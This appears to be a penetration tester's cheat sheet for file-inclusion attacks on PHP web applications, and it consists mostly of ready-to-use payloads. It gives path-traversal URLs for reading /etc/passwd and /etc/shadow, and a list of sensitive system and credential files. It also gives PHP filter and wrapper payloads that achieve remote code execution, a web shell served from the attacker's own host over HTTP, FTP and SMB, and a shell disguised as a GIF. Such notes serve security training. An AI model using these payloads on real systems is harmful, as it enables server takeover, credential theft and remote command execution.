#### Basic LFI (null byte, double encoding and other tricks) :

```bash
http://example.com/index.php?page=/etc/passwd
http://example.com/index.php?page=/etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?language=./languages/../../../../etc/passwd
```

#### Interesting files to check out :
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline

# Checking PHP Configurations, apache
/etc/php/X.Y/apache2/php.ini
# nginx
/etc/php/X.Y/fpm/php.ini
```

#### PHP Filters
Fuzzing for PHP Files to use the filters on them[enumerate with ffuf](obsidian://open?vault=Obsidian%20Vault&file=Tools%2Fffuf).
**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code

```bash
# using the base64 filter returned an encoded string instead of the empty result
php://filter/read=convert.base64-encode/resource=config (can be used in fuff also)
```

## Remote Code Execution
#### PHP Wrappers
```bash
### Data Wrapper
# getting the base64
echo '<?php system($_GET["cmd"]); ?>' | base64

# RCE with data Wrapper
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
----------------------------------------------------------------------------------------
### Input Wrapper
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
----------------------------------------------------------------------------------------
### Expect wrapper
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


## RFI
```bash
# Creating malicious script in PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# creating HTTP server
sudo python3 -m http.server <LISTENING_PORT>

# file include with ftp
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
----------------------------------------------------------------------------------------
# create FTP server
sudo python -m pyftpdlib -p # use the ftp:// scheme insted of http/s://

# if the ftp needs auth 
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
----------------------------------------------------------------------------------------
# create smb server 
impacket-smbserver -smb2support share $(pwd)

# include the script
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

```


## LFI and File Uploads
```bash
# Crafting Malicious Image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```